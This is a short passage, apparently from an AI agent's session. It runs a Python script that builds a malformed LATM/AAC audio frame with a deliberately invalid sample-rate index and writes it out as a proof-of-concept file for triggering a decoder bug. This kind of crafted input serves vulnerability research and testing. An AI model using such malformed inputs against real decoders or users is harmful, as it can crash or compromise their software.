Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
bits=[]
def w(v,n):
    for i in range(n-1,-1,-1): bits.append((v>>i)&1)
# StreamMuxConfig/useSameStreamMux and config
w(0,1) # useSameStreamMux false
w(0,1) # audioMuxVersion
w(1,1) # allStreamsSameTimeFraming
w(0,6) # numSubFrames
w(0,4) # numProgram
w(0,3) # numLayer
w(2,5) # AAC LC
w(13,4) # invalid sample rate index (array entry zero)
w(2,4) # stereo
w(0,3) # frameLengthType
w(0xff,8) # latmBufferFullness
w(0,1) # other data
w(0,1) # crc
# align? code immediately reads length bytes, no align. write length 9
w(9,8)
# payload 9 bytes
for b in b'ABCDEFGHI': w(b,8)
# pack bits
body=bytearray()
for i in range(0,len(bits),8):
    val=0
    for bit in bits[i:i+8]: val=(val<<1)|bit
    val <<= (8-len(bits[i:i+8]))%8
    body.append(val)
mux_size=len(body)
header=bytearray([0x56])
val=(0x7<<13)|mux_size
header.append((val>>8)&0xff); header.append(val&0xff)
data=bytes(header+body)
Path('/workspace/poc_latm_invalid_sr').write_bytes(data)
print(len(data), data.hex())
PY
